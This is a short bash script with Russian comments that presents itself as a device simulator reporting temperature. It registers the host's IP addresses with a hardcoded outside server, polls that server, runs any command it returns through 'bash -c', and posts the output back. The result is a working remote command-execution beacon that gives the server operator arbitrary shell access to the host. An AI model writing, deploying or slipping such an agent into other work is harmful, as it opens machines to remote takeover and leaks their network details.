#!/bin/bash

# Пример запуска:
# ./device.sh device123 5

DEVICE_ID=$1
PERIOD=$2

if [[ -z "$DEVICE_ID" || -z "$PERIOD" ]]; then
  echo "Использование: $0 DEVICE_ID ПЕРИОД_в_секундах"
  exit 1
fi

SERVER_URL="http://185.130.225.37:5000"

# Получение всех IP адресов (IPv4 кроме 127.0.0.1)
IP_LIST=$(ip -4 addr | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | paste -sd "," -)

# Регистрация устройства с IP
curl -X POST -d "id=$DEVICE_ID" -d "ip_list=$IP_LIST" "$SERVER_URL/register"
echo "Устройство $DEVICE_ID зарегистрировано с IP: $IP_LIST"

while true; do
  TEMPERATURE=$((20 + RANDOM % 11)) # случайная температура 20–30

  # Обновление IP-адресов перед heartbeat
  IP_LIST=$(ip -4 addr | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | paste -sd "," -)

  RESPONSE=$(curl -s -X POST -F "id=$DEVICE_ID" -F "temperature=$TEMPERATURE" -F "ip_list=$IP_LIST" "$SERVER_URL/heartbeat")
  #echo "$RESPONSE"
  
  CMD_ID=$(echo "$RESPONSE" | sed -n 's/.*"id":\([^,}]*\).*/\1/p' | tr -d '"')
  CMD=$(echo "$RESPONSE" | sed -n 's/.*"command":"\([^"]*\)".*/\1/p')

  if [[ -n "$CMD_ID" && "$CMD_ID" != "null" && -n "$CMD" ]]; then
    echo "Получена команда $CMD_ID: $CMD"
    RESULT=$(bash -c "$CMD" 2>&1)
    curl -s -X POST -F "command_id=$CMD_ID" -F "result=$RESULT" "$SERVER_URL/command_result" > /dev/null
    echo "Результат отправлен"
  fi

  sleep "$PERIOD"
done
